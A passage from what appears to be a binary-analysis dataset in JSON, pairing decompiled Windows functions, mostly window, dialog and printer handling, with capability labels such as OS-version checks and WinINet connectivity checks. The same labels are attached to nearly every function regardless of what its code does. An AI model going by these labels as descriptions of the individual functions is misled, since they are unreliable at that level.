        "decompiled_code": "\nuint __fastcall fcn.0042eb59(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042eb64. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x98))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 115
    },
    "0042eb6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042eb6f(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042eb7a. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x54))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "0042eb82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042eb82(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        fcn.0042cb01(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042eba3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x74))();\n    return;\n}\n",
        "token_count": 154
    },
    "0042eba6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042eba6(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *unaff_retaddr;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        *unaff_retaddr = uVar1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ebc7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x70))();\n    return;\n}\n",
        "token_count": 162
    },
    "0042ebfd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ebfd(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ec14. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x78))();\n    return;\n}\n",
        "token_count": 131
    },
    "0042ec17": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ec17(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ec2e. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x7c))();\n    return;\n}\n",
        "token_count": 132
    },
    "0042ec31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ec31(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.0042b513(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ec55. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x84))();\n    return;\n}\n",
        "token_count": 151
    },
    "0042ec5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042ec5b(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextA)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ec76. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x88))();\n    return;\n}\n",
        "token_count": 135
    },
    "0042ec7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ec7c(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ec91. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x90))();\n    return;\n}\n",
        "token_count": 126
    },
    "0042ec97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ec97(uint X, uint Y, uint nWidth, uint nHeight, uint bRepaint)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(in_ECX + 0x1c), X, Y, nWidth, nHeight, bRepaint);\n    }\n    else {\n        (**(**(in_ECX + 0x4c) + 0x98))(X, Y, nWidth, nHeight);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "0042ecd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042ecd5(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ecf0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa0))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042ecf6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ecf6(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ed0b. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa4))();\n    return;\n}\n",
        "token_count": 126
    },
    "0042ed11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042ed11(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ed2c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa8))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042ed53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042ed53(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    if (*(arg_8h + 0x4c) != 0) {\n        (**(**(arg_8h + 0x4c) + 0x60))(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &arg_20h);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0042ed9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042ed9e(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    if ((*(param_1 + 0x4c) == 0) && (*(param_2 + 0x48) != 0)) {\n        (**(**(param_2 + 0x48) + 0x9c))(param_1, param_3);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0042edc3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042edc3(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n    // WARNING: Could not recover jumptable at 0x0042edce. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*param_1[1] + 0x78))();\n        return;\n    }\n    (*_sym.imp.USER32.dll_GetWindowLongA)(*param_1, 0xfffffff0);\n    return;\n}\n",
        "token_count": 115
    },
    "0042ee21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ee21(int32_t arg_8h, uint X, uint Y, uint cx, uint cy, uint uFlags)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        if (arg_8h != 0) {\n            arg_8h = *(arg_8h + 0x1c);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x1c), arg_8h, X, Y, cx, cy, uFlags);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ee57. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x9c))();\n    return;\n}\n",
        "token_count": 199
    },
    "0042ee5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ee5d(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x4c) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n        iVar2 = fcn.0042a68a(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x48) != 0)) {\n            (**(**(iVar2 + 0x48) + 0x9c))(param_1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0042ee9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042ee9e(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    bool bVar6;\n    code *var_8h;\n    code *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        if (arg_ch == 0) {\n            var_8h = 0x43715a;\n            var_4h = 0x40e761;\n        }\n        else {\n            var_8h = 0x42ee1c;\n            var_4h = 0x40f1a5;\n        }\n        arg_ch = (*var_4h)();\njoined_r0x0042eee6:\n        do {\n            if (arg_ch == 0) {\n                return NULL;\n            }\n            ppiVar3 = (*var_8h)(&arg_ch);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto joined_r0x0042eee6;\n                bVar6 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar6 = arg_8h == piVar1;\n            }\n        } while (!bVar6);\n        if (piVar1 != NULL) {\n            if (arg_ch == 0) {\n                arg_ch = (*var_4h)();\n            }\n            do {\n                ppiVar3 = (*var_8h)(&arg_ch);\n                piVar2 = *ppiVar3;\n                uVar5 = fcn.0042edc3();\n                if (piVar2 == piVar1) {\n                    return piVar2;\n                }\n                if (((uVar5 & 0x10000) != 0) && ((uVar5 & 0x8000000) == 0)) {\n                    return piVar2;\n                }\n            } while (arg_ch != 0);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 544
    },
    "0042ef7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042ef7a(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint uVar6;\n    bool bVar7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        var_4h = *(*(in_ECX + 0x48) + 0x44);\ncode_r0x0042efd8:\n        do {\n            piVar2 = var_4h;\n            if (var_4h == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0040f1a9(&var_4h);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto code_r0x0042efd8;\n                bVar7 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar7 = arg_8h == piVar1;\n            }\n        } while (!bVar7);\n        if ((var_4h != NULL) && (piVar1 != NULL)) {\n            bVar7 = false;\n            do {\n                puVar5 = fcn.0040f1a9(&var_4h);\n                uVar6 = *puVar5;\n                var_ch = fcn.0042edc3();\n                if ((!bVar7) && ((var_ch & 0x20000) != 0)) {\n                    bVar7 = true;\n                    arg_8h = piVar2;\n                    fcn.0040e765(&arg_8h);\n                    while (arg_8h != NULL) {\n                        puVar5 = fcn.0040e765();\n                        uVar6 = *puVar5;\n                        var_ch = fcn.0042edc3();\n                        if ((var_ch & 0x20000) != 0) {\n                            return uVar6;\n                        }\n                    }\n                }\n                if ((var_ch & 0x8000000) == 0) {\n                    return uVar6;\n                }\n            } while (var_4h != NULL);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 605
    },
    "0042f076": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f076(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint uVar6;\n    bool bVar7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        var_4h = *(*(in_ECX + 0x48) + 0x40);\ncode_r0x0042f0d4:\n        do {\n            piVar2 = var_4h;\n            if (var_4h == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0040e765(&var_4h);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto code_r0x0042f0d4;\n                bVar7 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar7 = arg_8h == piVar1;\n            }\n        } while (!bVar7);\n        if ((var_4h != NULL) && (piVar1 != NULL)) {\n            bVar7 = false;\n            do {\n                puVar5 = fcn.0040e765(&var_4h);\n                uVar6 = *puVar5;\n                var_ch = fcn.0042edc3();\n                if ((!bVar7) && ((var_ch & 0x20000) != 0)) {\n                    bVar7 = true;\n                    arg_8h = piVar2;\n                    fcn.0040f1a9(&arg_8h);\n                    while (arg_8h != NULL) {\n                        puVar5 = fcn.0040f1a9();\n                        uVar6 = *puVar5;\n                        var_ch = fcn.0042edc3();\n                        if ((var_ch & 0x20000) != 0) {\n                            return uVar6;\n                        }\n                    }\n                }\n                if ((var_ch & 0x8000000) == 0) {\n                    return uVar6;\n                }\n            } while (var_4h != NULL);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 608
    },
    "0042f172": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f172(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint *puVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*(in_ECX + 0x48) == 0) {\n        return;\n    }\n    if (arg_8h == NULL) {\n        return;\n    }\n    if ((arg_8h[2] == 0) ||\n       (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*arg_8h, 0xf0, 0, 0),  puVar4 = arg_8h,  iVar2 != 1)) {\n        puVar3 = fcn.0042a267(arg_8h, 0);\n        puVar6 = &arg_8h;\n        arg_8h = puVar3;\n        fcn.0040e765(puVar6);\n        do {\n            if (arg_8h == NULL) {\ncode_r0x0042f217:\n                arg_8h = puVar3;\n                fcn.0040f1a9(&arg_8h, puVar6);\n                while( true ) {\n                    if (arg_8h == NULL) {\n                        return;\n                    }\n                    puVar4 = fcn.0040f1a9(&arg_8h);\n                    puVar4 = *puVar4;\n                    if ((puVar4[2] != 0) && (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 == 1)) break;\n                    uVar5 = fcn.0042edc3();\n                    if ((uVar5 & 0x20000) != 0) {\n                        return;\n                    }\n                }\n                break;\n            }\n            puVar6 = &arg_8h;\n            puVar4 = fcn.0040e765();\n            puVar4 = *puVar4;\n            uVar5 = fcn.0042edc3();\n            if ((uVar5 & 0x20000) != 0) goto code_r0x0042f217;\n        } while ((puVar4[2] == 0) || (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 != 1));\n    }\n    (*pcVar1)(*puVar4, 0xf1, 0, 0);\n    return;\n}\n",
        "token_count": 601
    },
    "0042f282": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpString2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042f282(uint lpString1, uint iMaxLength)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpString2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    if (*(extraout_ECX + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowTextA)(*(extraout_ECX + 0x1c), *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    else {\n        piVar2 = fcn.004308e7();\n        iVar3 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar3 + 0x10;\n        iVar3 = **(extraout_ECX + 0x4c);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar3 + 0x8c))(unaff_EBP + -0x10);\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0xc));\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        fcn.004014f0();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 418
    },
    "0042f43f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042f43f(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar4;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.00438818();\n        iVar1 = (**(**(iVar1 + 0x1038) + 4))();\n        return iVar1;\n    }\n    if (arg_ch == 0xfffffffd) {\n        iVar1 = *(arg_10h + 0x30);\n        arg_ch = 0;\n        puVar2 = (**(*in_ECX + 0x2c))();\n        do {\n            if (puVar2 == NULL) {\n                return arg_ch;\n            }\n            if (arg_ch != 0) {\n                return arg_ch;\n            }\n            piVar4 = puVar2[1];\n            while (((piVar4[1] != 0 && (piVar4[2] != 0)) && (arg_ch == 0))) {\n                if (arg_8h == piVar4[1]) {\n                    if (iVar1 == 0) {\n                        if (*piVar4 == 0) {\ncode_r0x0042f4cb:\n                            *(arg_10h + 4) = piVar4[2];\n                            arg_ch = 1;\n                        }\n                    }\n                    else if ((*piVar4 != 0) && (iVar3 = fcn.0040f1d0(iVar1, *piVar4),  iVar3 != 0))\n                    goto code_r0x0042f4cb;\n                }\n                piVar4 = piVar4 + 3;\n            }\n            puVar2 = *puVar2;\n        } while( true );\n    }\n    if (arg_ch != 0xffffffff) {\n        arg_ch_00 = arg_ch >> 0x10;\n        arg_ch = arg_ch & 0xffff;\n        if (arg_ch_00 != 0) goto code_r0x0042f504;\n    }\n    arg_ch_00 = 0x111;\ncode_r0x0042f504:\n    puVar2 = (**(*in_ECX + 0x28))();\n    while( true ) {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        iVar1 = fcn.0042b752(puVar2[1], arg_ch_00, arg_ch, arg_8h);\n        if (iVar1 != 0) break;\n        puVar2 = *puVar2;\n    }\n    iVar1 = fcn.0042f329(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n    return iVar1;\n}\n",
        "token_count": 667
    },
    "0042f91a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f91a(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x70) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x70));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if ((iVar2 == 0) && (iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x6c) != 0) {\n                fcn.00433666(*(in_ECX + 0x6c));\n            }\n            uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n            *(in_ECX + 0x6c) = uVar3;\n            uVar3 = (*pcVar1)(uVar3);\n            iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n            if (iVar2 != 1) {\n                fcn.00433666(*(in_ECX + 0x6c));\n                *(in_ECX + 0x6c) = 0;\n            }\n            sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 431
    },
    "0042fbfb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042fbfb(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.0043883e();\n    if (((*(iVar1 + 4) != 0) && (*param_1 == 0)) && (iVar1 = fcn.0042fb66(param_1),  iVar1 != 0)) {\n        return 1;\n    }\n    piVar2 = fcn.004015c0();\n    piVar4 = piVar2;\n    if (piVar2 != NULL) {\n        piVar4 = piVar2[7];\n    }\n    iVar1 = fcn.0042cfb0(piVar4, param_1);\n    if (iVar1 == 0) {\n        if (piVar2 != NULL) {\n            fcn.0042cb01(*param_1);\n            piVar4 = fcn.0042d950();\n            if (piVar4 != piVar2) {\n                uVar3 = (**(*piVar2 + 0x100))(param_1);\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 299
    },
    "0042ff16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042ff16(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00438818();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.00438808();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x42fd98, 0, uVar2);\n        *(iVar1 + 0x2c) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "004300e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
